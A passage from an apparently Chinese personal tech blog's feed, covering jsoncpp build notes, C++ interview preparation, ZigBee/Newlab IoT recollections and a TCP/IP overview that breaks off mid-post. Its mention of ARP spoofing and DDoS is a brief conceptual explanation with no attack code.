class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;json/json.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        std::ifstream is;</span><br><span class="line">        is.<span class="built_in">open</span>(<span class="string">&quot;test.json&quot;</span>, std::ios::binary);</span><br><span class="line"></span><br><span class="line">        Json::Reader reader;</span><br><span class="line">        Json::Value root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(reader.<span class="built_in">parse</span>(is, root))&#123;</span><br><span class="line">                <span class="keyword">auto</span> members = root.<span class="built_in">getMemberNames</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; members.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                        std::cout &lt;&lt; members[i] &lt;&lt; <span class="string">&quot;==&gt;&quot;</span> &lt;&lt; root[members[i]].<span class="built_in">toStyledString</span>() &lt;&lt; std::endl;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>g++编译，这里注意因为我们源文件include的时候没有完全用相对路径，所以可以指明json.h从哪个目录里找，然后就是关联静态库生成二进制文件<br><code>g++ jstest.cpp -I ./include/  -o libjs ./libs/linux-gcc-7/libjson_linux-gcc-7_libmt.a</code></p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/007.png" class=""><p>就可以解析json文件内容了。</p><blockquote><p>当然读取的方式可以有很多，此处我是根据一个key往下走，没了再看下一个key如此反复循环，</p></blockquote><p>然后试试看新版本的cmake，要是太麻烦就拉倒哈哈。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/008.png" class=""><blockquote><p>原来tags有分版本，额确实是github不熟练了。<br>0.5还去别的网站下，直接从这里wget就好了</p></blockquote><p>直接wget获取<br><code>wget https://github.com/open-source-parsers/jsoncpp/archive/0.10.5.zip</code><br>然后解压<br><code>unzip 0.10.5.zip</code></p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/009.png" class=""><blockquote><p>在编译的时候有个问题需要注意，那就是0.10.x系列都是五六年，七八年前的产品，而现在的ubuntu18起，gcc、cmake的版本和标准只会越来越高。</p></blockquote><p><strong>卒，解决不来，百度半天也没有合适的解答，0.10.5 or 0.10.6 make的时候均报错，都是智能指针和某些问题导致</strong></p><p>但是相反的，scons则可以构建虽然也能看到几个问题，但是最终还是能生成库文件。这令我不解？</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/010.png" class=""><blockquote><p>TODO: 若是以后有遇到回头再补充。</p></blockquote><p>同时linux编译最新版的jsoncpp，好像cmake版本也不够。</p><blockquote><p>cmake –verison<br>我的ubuntu18是3.10.2版本</p></blockquote><p>参考这个文章下个高版本的吧。<a href="https://blog.csdn.net/weixin_43779943/article/details/98485254">文章地址</a></p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/021.png" class=""><p><a href="https://blog.csdn.net/weixin_44290011/article/details/109120478">参照文章</a></p><blockquote><p>注意这篇文章是20年发布的，版本是1.9.4<br>你通过上文改的cmake版本只适用于此。不适用于22年的最新版本，我试过了。</p></blockquote><p><code>wget https://github.com/open-source-parsers/jsoncpp/archive/1.9.4.zip</code><br>然后剩余步骤跟参考文章来就行</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/022.png" class=""><p>能看到cmake确实没报错。<br>然后make执行完之后，lib文件也生成了。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/023.png" class=""><blockquote><p>结论就是。。。其实并不麻烦，就是要选对cmake版本？<br>有一定道理，因为我windows编译的时候cmake下的就是最新的，然后也是编译的最新版本。</p></blockquote><hr><h2 id="2-windows"><a href="#2-windows" class="headerlink" title="2.windows"></a>2.windows</h2><p><del>README.md有教你用vcpkg的方式去下载安装：</del><br>先不管这个，搞cmake好了。</p><p>安装cmake</p><blockquote><p><a href="https://cmake.org/download/">https://cmake.org/download/</a></p></blockquote><p>windows总得认识吧哈哈，msi和zip应该问题不大。<br>直接用msi安装了</p><p>打开cmake-gui，也就是图形化的意思</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/011.png" class=""><p>然后注意git clone下jsoncpp，或者在github上下载zip压缩包解压也一样。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/014.png" class=""><p>然后指定下git过来的文件和要输出到哪个文件夹</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/012.png" class=""><p>根据编译器选择版本，有x86需求第二栏就填上，没有默认为x64。单选按钮就默认的。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/013.png" class=""><p>选择正确的话他会开始跑一段不用管，然后点击Generate</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/015.png" class=""><p>等待done之后，打开输出目录，找到<code>.sln</code>就是vs的项目文件打开</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/016.png" class=""><p>右击这个项目设为启动项，然后点击菜单栏中的生成。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/017.png" class=""><p>看到这么一段话就算ok了。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/018.png" class=""><blockquote><p>最后根据提示的两个路径下分别能找到lib和dll文件<br>你只需要带走clone过来的目录下有个include头文件夹里面的json文件夹和这俩其中一个，给其他项目属性改下就能用了。</p></blockquote><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/019.png" class=""><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/020.png" class=""><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>害，编译最主要是环境问题，软件的版本，下载的文件版本，不适配是很难编译出来的。<br>所以找现场的也没有太大毛病。</p>]]></content>
      
      
      <categories>
          
          <category> 开源项目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>易栈</title>
      <link href="/2022/11/28/%E6%98%93%E6%A0%88/"/>
      <url>/2022/11/28/%E6%98%93%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="16652a6dbab83908e9671073f7b630f21bc599915eacdd0754cb63ee60013e5e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WTL </tag>
            
            <tag> Sqlite3 </tag>
            
            <tag> Json </tag>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>get他人面试技巧1.0</title>
      <link href="/2022/11/22/%E9%9D%A2%E8%AF%951-0/"/>
      <url>/2022/11/22/%E9%9D%A2%E8%AF%951-0/</url>
      
        <content type="html"><![CDATA[<p>临近出去实习的日子，很快，一切都感觉没抓住。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>面试其实也挺玄学的，但大致会基于以下两点吧。</p><ol><li>学历</li><li>实习还是有过工作经验</li></ol><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-学历"><a href="#1-学历" class="headerlink" title="1.学历"></a>1.学历</h2><p>从群友那吸取了点经验。</p><p>一本的有机会去大厂面试，第一轮都是算法题，过了之后是看还有别的面试还是直接hr面，hr面过了基本都稳了。</p><p>大专是肯定摸不到大厂的，中小的企业有就不错了。</p><blockquote><p>这里的核心点就是，如果你不是高学历的，而且基础开发岗位，直接问算法的不会这么多，除非你选的岗位要求有介绍。</p></blockquote><hr><h2 id="2-工作经验-无"><a href="#2-工作经验-无" class="headerlink" title="2.工作经验-无"></a>2.工作经验-无</h2><p>应届实习生在没有什么项目经历的情况下，大多都是八股文类型问题。</p><blockquote><p>直接百度语种+八股文，可能会有出入，但是基本功要扎实就要背要记住</p></blockquote><p>最常见的比如：</p><ul><li>关键字的使用和细节</li><li>编译详细步骤</li><li>内存分区</li><li>函数</li><li>面向对象语法</li><li>…等等</li></ul><blockquote><p>不排除会问数据结构和算法，怎么圆看个人</p></blockquote><p>如果有复刻过什么项目写在简历上了，那么就要做好被提问的准备。</p><hr><h2 id="3-工作经验-有"><a href="#3-工作经验-有" class="headerlink" title="3.工作经验-有"></a>3.工作经验-有</h2><p>如果是有工作经验的，会直接从你的简历问项目经历，你负责的模块，具体怎么实现，有没有遇到什么bug以及怎么处理。。。</p><p>除此之外如果也有考察八股文也不稀奇，基础功嘛，只不过有些公司可能不会问了。</p><p>然后就是：</p><ul><li>协议</li><li>操作系统的应用</li><li>网络模型</li><li>开源项目阅读和了解还是使用</li><li>阅读过哪一类书籍</li><li>为什么从上一家公司离职</li><li>今后有什么规划和打算</li></ul><blockquote><p>其实有工作经验也挺尬，因为上一家很有可能没有学到什么技术然后就离职了，那么问起老东家的项目和你自己实战经验就会很空缺。</p><p>其次就是感觉都挺反感但是都有问的离职原因。。</p></blockquote><hr><h2 id="c-搜一搜面试题"><a href="#c-搜一搜面试题" class="headerlink" title="c++搜一搜面试题"></a>c++搜一搜面试题</h2><h3 id="1-八股文"><a href="#1-八股文" class="headerlink" title="1.八股文"></a>1.八股文</h3><h4 id="变量的声明和定义有何区别"><a href="#变量的声明和定义有何区别" class="headerlink" title="变量的声明和定义有何区别"></a>变量的声明和定义有何区别</h4><h4 id="右值引用是什么？跟左值有何区别"><a href="#右值引用是什么？跟左值有何区别" class="headerlink" title="右值引用是什么？跟左值有何区别"></a>右值引用是什么？跟左值有何区别</h4><h4 id="volatile关键字"><a href="#volatile关键字" class="headerlink" title="volatile关键字"></a>volatile关键字</h4><h4 id="const和static用法"><a href="#const和static用法" class="headerlink" title="const和static用法"></a>const和static用法</h4><h4 id="typedef和define"><a href="#typedef和define" class="headerlink" title="typedef和define"></a>typedef和define</h4><h4 id="struct和class的区别"><a href="#struct和class的区别" class="headerlink" title="struct和class的区别"></a>struct和class的区别</h4><h4 id="c-x2F-c-函数编译时有什么区别"><a href="#c-x2F-c-函数编译时有什么区别" class="headerlink" title="c&#x2F;c++函数编译时有什么区别"></a>c&#x2F;c++函数编译时有什么区别</h4><h4 id="内联函数和宏定义的函数区别"><a href="#内联函数和宏定义的函数区别" class="headerlink" title="内联函数和宏定义的函数区别"></a>内联函数和宏定义的函数区别</h4><h4 id="c-x2F-c-编译四大步骤"><a href="#c-x2F-c-编译四大步骤" class="headerlink" title="c&#x2F;c++编译四大步骤"></a>c&#x2F;c++编译四大步骤</h4><h4 id="c-x2F-c-内存分区"><a href="#c-x2F-c-内存分区" class="headerlink" title="c&#x2F;c++内存分区"></a>c&#x2F;c++内存分区</h4><h4 id="简述堆栈的区别"><a href="#简述堆栈的区别" class="headerlink" title="简述堆栈的区别"></a>简述堆栈的区别</h4><h4 id="c-传值方式有哪几种"><a href="#c-传值方式有哪几种" class="headerlink" title="c++传值方式有哪几种"></a>c++传值方式有哪几种</h4><h4 id="c-强制类型转换怎么用"><a href="#c-强制类型转换怎么用" class="headerlink" title="c++强制类型转换怎么用"></a>c++强制类型转换怎么用</h4><h4 id="静态变量、全局变量、局部变量特点"><a href="#静态变量、全局变量、局部变量特点" class="headerlink" title="静态变量、全局变量、局部变量特点"></a>静态变量、全局变量、局部变量特点</h4><h4 id="计算机源码、反码、补码"><a href="#计算机源码、反码、补码" class="headerlink" title="计算机源码、反码、补码"></a>计算机源码、反码、补码</h4><h4 id="指针-空指针、野指针、函数指针等"><a href="#指针-空指针、野指针、函数指针等" class="headerlink" title="指针-空指针、野指针、函数指针等"></a>指针-空指针、野指针、函数指针等</h4><h4 id="指针和引用的区别"><a href="#指针和引用的区别" class="headerlink" title="指针和引用的区别"></a>指针和引用的区别</h4><h4 id="new-x2F-delete和malloc-x2F-free的区别"><a href="#new-x2F-delete和malloc-x2F-free的区别" class="headerlink" title="new&#x2F;delete和malloc&#x2F;free的区别"></a>new&#x2F;delete和malloc&#x2F;free的区别</h4><h4 id="面向对象四大特性"><a href="#面向对象四大特性" class="headerlink" title="面向对象四大特性"></a>面向对象四大特性</h4><h4 id="STL模板"><a href="#STL模板" class="headerlink" title="STL模板"></a>STL模板</h4><p>在C++标准中，STL被组织为下面的13个头文件：<code>&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt;、&lt;utility&gt;</code></p><blockquote><p>能问的其实挺多的，一个stl就有这么多个容器可以问</p></blockquote><hr><h3 id="2-网络"><a href="#2-网络" class="headerlink" title="2.网络"></a>2.网络</h3><h4 id="描述TCP协议"><a href="#描述TCP协议" class="headerlink" title="描述TCP协议"></a>描述TCP协议</h4><h4 id="描述三次握手过程"><a href="#描述三次握手过程" class="headerlink" title="描述三次握手过程"></a>描述三次握手过程</h4><h4 id="描述四次挥手过程"><a href="#描述四次挥手过程" class="headerlink" title="描述四次挥手过程"></a>描述四次挥手过程</h4><h4 id="描述UDP协议"><a href="#描述UDP协议" class="headerlink" title="描述UDP协议"></a>描述UDP协议</h4><hr><h3 id="3-windows"><a href="#3-windows" class="headerlink" title="3.windows"></a>3.windows</h3><hr><h3 id="4-linux"><a href="#4-linux" class="headerlink" title="4.linux"></a>4.linux</h3><hr><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5.最后"></a>5.最后</h3><p>诸如此类，至于windows和linux择一发展吧，全栈吃不消的，顶多是有了解会cv大法。</p><hr><h2 id="还有就是"><a href="#还有就是" class="headerlink" title="还有就是"></a>还有就是</h2><p>大专群友几次面试过来，公司水平参差不齐，有的还是临时找c&#x2F;c++岗位的，这就导致面试问不到点子上或者给7、8k的钱想让你干15k的活。</p><p>地区也是一个很大因素，一线城市房租日常消费高，所以工资也会好看很多。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>核心就是简历，其次面试就是口才</p><p>自信为主，实力为辅——这句话就是江湖人称唬住了10k，唬不住5k，然后实力就是看你能在这个公司留多久了，能不能度过实习期或者试用期，转正之后又能干多久。</p><blockquote><p>疫情这几年互联网也不好弄，低学历的简直是雪上加霜。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zigbee和newlab</title>
      <link href="/2022/11/22/zigbee/"/>
      <url>/2022/11/22/zigbee/</url>
      
        <content type="html"><![CDATA[<p>昨天和群友随口谈了一下工作，有一些对嵌入式硬件方面有兴趣，而我大概只记得用过zigbee和newlab这么两个东西，而且之前的设备都挺老的，实际上的嵌入式一搜都是什么单片机起步，烧写刻录巴拉巴拉的。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都是比较老的东西了，同属于物联网阵营。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="zigbee"><a href="#zigbee" class="headerlink" title="zigbee"></a>zigbee</h2><p>翻译过来好像叫紫峰。</p><p>zigbee的几个特点：</p><p>①低功耗。在低耗电待机模式下，2节5号干电池可支持1个节点工作6～24个月，甚至更长。这是ZigBee的突出优势。相比较，蓝牙能工作数周、WiFi可工作数小时。</p><p>TI公司和德国的Micropelt公司共同推出新能源的ZigBee节点。该节点采用Micropelt公司的热电发电机给TI公司的ZigBee提供电源。</p><p>②低成本。通过大幅简化协议(不到蓝牙的1&#x2F;10)，降低了对通信控制器的要求，按预测分析，以8051的8位微控制器测算，全功能的主节点需要32KB代码，子功能节点少至4KB代码，而且ZigBee免协议专利费。每块芯片的价格大约为2美元。</p><p>③低速率。ZigBee工作在20～250kbps的速率，分别提供250 kbps(2.4GHz)、40kbps(915 MHz)和20kbps(868 MHz)的原始数据吞吐率，满足低速率传输数据的应用需求。</p><p>④近距离。传输范围一般介于10～100m之间，在增加发射功率后，亦可增加到1～3km。这指的是相邻节点间的距离。如果通过路由和节点间通信的接力，传输距离将可以更远。</p><p>⑤短时延。ZigBee的响应速度较快，一般从睡眠转入工作状态只需15ms，节点连接进入网络只需30ms，进一步节省了电能。相比较，蓝牙需要3～10s、WiFi 需要3 s。</p><p>⑥高容量。ZigBee可采用星状、片状和网状网络结构，由一个主节点管理若干子节点，最多一个主节点可管理254个子节点；同时主节点还可由上一层网络节点管理，最多可组成65000 个节点的大网。</p><p>⑦高安全。ZigBee提供了三级安全模式，包括安全设定、使用访问控制清单(Access Control List, ACL) 防止非法获取数据以及采用高级加密标准(AES 128)的对称密码，以灵活确定其安全属性。</p><p>⑧免执照<a href="https://baike.baidu.com/item/%E9%A2%91%E6%AE%B5?fromModule=lemma_inlink">频段</a>。使用工业科学医疗(ISM)频段，915MHz(美国), 868MHz(欧洲), 2.4GHz(全球) 。</p><blockquote><p>实际在我很早之前学习的时候确实能感知到几个点</p><p>对于功耗，他能用电池撑很久</p><p>对于成本，他的一个模块价格也还行，自己倒腾也买得起</p><p>对于速率，相比较现在的带宽肯定是很小了，但是放在物联网这种简易传输下用处还凑合</p><p>对于距离，的确，zigbee功耗低成本低自然能传输的距离也小，通过接力能够有效增加距离但是这个结构大了管理维护量化考虑都是个问题，只能说是个办法</p><p>对于时延、容量、安全，怎么说呢，确实没印象了。。</p></blockquote><p>当时好像是西安开元电子啥的公司的。</p><p>反正听抽象，就一台很大的机架，可以简单的走线，然后安置模块，有个集成的控制屏幕，可以用qt写了连接上去。印象里应该是玩过光敏传感器、风扇传感器-根据温度或者气体、声控等一些设备。</p><hr><h2 id="newlab"><a href="#newlab" class="headerlink" title="newlab"></a>newlab</h2><p>这玩意更骚，学了就忘了哈哈</p><p>在网上搜了一下，这个<a href="http://www.newland-edu.com/proshow?product_id=58">网址</a>首页的图片就是当时用的了。</p><img src="/2022/11/22/zigbee/000.png" class=""><p>四个洞是用来固定的好像，因为板子的四个角就是铁的，可以吸住，至于这个供电好像是左边这几个针脚来着。</p><p>反正开发板上面挺多接口的，也分类型。可以装模块玩，蓝牙控制小风扇之类的。</p><hr><h1 id="总而言之"><a href="#总而言之" class="headerlink" title="总而言之"></a>总而言之</h1><p>那会设备真的老，而且也有几年了。以后到底是在windows还是linux开发的工作都不晓得。</p><p>最新一点的也就玩过树莓派，可惜的是都是厂家或者卖家提供的驱动哈哈。或者就是定制系统iso。</p>]]></content>
      
      
      
        <tags>
            
            <tag> loT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音视频开发</title>
      <link href="/2022/11/08/%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/"/>
      <url>/2022/11/08/%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2a16924444afbd057b7b6fd1812c02a9f26a3b38a5fcf5fcff642348a3241929"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
            <tag> VLC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天气预报</title>
      <link href="/2022/11/05/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/"/>
      <url>/2022/11/05/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="025e4d685c2595e9df60e877dd7d73a468249cc179002b9651592fd640d6e6f6"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络通信】UDP穿透(局域网版)</title>
      <link href="/2022/10/28/udp/"/>
      <url>/2022/10/28/udp/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="8b8d42a7ce74c1541c868c2dbedff52c0e5ed15b09cf3768452cf7daac782fae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络通信】TCP/IP</title>
      <link href="/2022/10/25/tcp-ip/"/>
      <url>/2022/10/25/tcp-ip/</url>
      
        <content type="html"><![CDATA[<p>搞cpp，网络知识还是必不可少的，学了半天还是得写出来梳理一下过程。<br>都是水文，个人见解哈哈！</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。<br>——不用想，这就是百度的。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>实际上有个理想的osi七层模型(自上向下)</p><ol><li>应用层 - 是下几层最终汇成常见的协议http、ftp等</li><li>表示层 - 其实就是展示给人看的了，也就是各种文件格式</li><li>会话层 - 对于进程，也就是正在运行的会话</li><li>传输层 - 传输单位是包</li><li>网络层 - 传输单位是报文</li><li>数据链路层 - 传输单位是帧</li><li>物理层 - 最底层，传输单位是比特(bit)</li></ol><p>对于tcp&#x2F;ip模型分为四层或五层</p><ol><li>应用层：也就是把表示层和会话层合并了</li><li>传输层</li><li>网络层</li><li>网络接口层：此处兼并了物理层和数据链路层，所以会有五层的说法</li></ol><p><strong>对于目前所需，显然是TCP和UDP，并且这俩这是传输层的协议</strong><br>关于详细的分层，包括淦神魔的自行检索</p><hr><h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>比较常见的应该就是ARP欺骗和ICMP欺骗了<br>这俩都是属于网络层的协议</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>arp是根据ip地址获取物理地址(MAC地址)的一个协议，由于arp协议没有状态，不管有没有收到都会自动缓存，所以通过这种机制，攻击方发送假的arp数据包给目标主机，从而引导特定的流量到攻击方所设置的地方。</p><h3 id="ICMP欺骗"><a href="#ICMP欺骗" class="headerlink" title="ICMP欺骗"></a>ICMP欺骗</h3><p>这玩意也差不多，主要用来提供错误报告，发现错误就返回主机，常见的ping命令就是基于ICMP的。也就有了DOS攻击这么个玩意，主机在长时间发送大量ICMP包的情况下造成cpu资源消耗，从而导致系统瘫痪，不过目前的服务器都很吊了，加上可以对这种ip直接进行封禁，所以又诞生了ddos攻击，也就是分布式的dos攻击。可谓是物理打击最为致命，分布的情况下你也不能一棒子全部打死，只能采取流量分析、氪金打造硬件之类的解决，其实也不算真正解决吧。</p><blockquote><p>这也是近年来网安发展这么快的原因，后面还有各种防火墙，虽然真正有技术的还是少部分人吧，大多都是常规软件扫漏，分析日志和打打比赛。</p></blockquote><hr><h2 id="介绍TCP-x2F-UDP"><a href="#介绍TCP-x2F-UDP" class="headerlink" title="介绍TCP&#x2F;UDP"></a>介绍TCP&#x2F;UDP</h2><ul><li>tcp协议是可靠的，稳定的，面向连接</li><li>udp协议是不可靠的，不稳定的，面向无连接</li></ul><h3 id="对于连接"><a href="#对于连接" class="headerlink" title="对于连接"></a>对于连接</h3><ol><li>tcp在传输数据前要先建立连接</li><li>udp则是不需要连接的，只管发</li></ol><hr><h3 id="服务对象"><a href="#服务对象" class="headerlink" title="服务对象"></a>服务对象</h3><ol><li>tcp的特性让它只能一对一的两点服务</li><li>udp支持一对一、一对多、多对多的交叉</li></ol><hr><h3 id="可靠性"><a href="#可靠性" class="headerlink" title="可靠性"></a>可靠性</h3><ol><li>tcp是可靠交付数据，保证数据无差错、不丢失、不重复、按需到达</li><li>udp就是尽最大努力交付，不保证数据可靠性</li></ol><hr><h3 